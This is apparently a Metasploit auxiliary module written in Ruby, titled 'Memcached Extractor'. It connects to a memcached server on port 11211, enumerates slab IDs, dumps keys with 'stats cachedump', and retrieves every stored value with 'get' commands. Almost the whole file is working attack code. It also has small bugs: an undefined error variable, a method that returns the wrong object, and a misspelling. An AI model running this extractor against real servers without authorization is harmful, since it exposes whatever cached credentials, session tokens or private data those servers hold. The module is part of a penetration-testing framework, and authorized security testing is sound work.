##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Memcached Extractor',
      'Description'   => %q(
        This module extracts the slabs from a memcached instance.  It then
        finds the keys and values stored in those slabs.
      ),
      'Author'       => [ 'Paul Deardorff <paul_deardorff[at]rapid7.com>' ],
      'License'      => MSF_LICENSE
    ))

    register_options(
      [
        Opt::RPORT(11211)
      ], self.class)
  end

  # Returns array of keys for all slabs
  def enumerate_keys
    keys = []
    enumerate_slab_ids.each do |sid|
      sock.send("stats cachedump #{sid} 100\r\n", 0)
      data = sock.recv(4096)
      matches = /^ITEM (?<key>.*) \[/.match(data)
      keys << matches[:key] if matches
    end
    keys
  end

  # Returns array of slab ids as strings
  def enumerate_slab_ids
    sock.send("stats slabs\r\n", 0)
    slab_ids = []
    loop do
      data = sock.recv(4096)
      break if !data || data.length == 0
      matches = data.scan(/^STAT (?<slab_id>(\d)*):/)
      slab_ids << matches
      break if data =~ /^END/
    end
    slab_ids.flatten!
    slab_ids.uniq!
  end

  def data_for_keys(keys = [])
    all_data = {}
    keys.each do |key|
      sock.send("get #{key}\r\n", 0)
      data = []
      loop do
        data_part = sock.recv(4096)
        break if !data_part || data_part.length == 0
        data << data_part
        break if data_part =~ /^END/
      end
      all_data[key] = data
    end
  end

  def determine_version
    sock.send("stats\r\n", 0)
    stats = sock.recv(4096)
    matches = /^STAT (?<version>version (\.|\d)*)/.match(stats)
    matches[:version] || 'unkown version'
  end

  def run
    print_status("#{rhost}:#{rport} - Connecting to memcached server...")
    if connect
      print_good("Connected to memcached #{determine_version}")
      keys = enumerate_keys
      print_good("Found #{keys.size} keys")
      data = data_for_keys(keys)
      #store_loot('memcached.dump', 'text/plain', datastore['RHOST'], data, 'memcached.text', 'Memcached extractor')
      #print_good("Loot stored!")
    else
      print_error("Could not connect to memcached server! #{e}")
      return
    end
  end
end
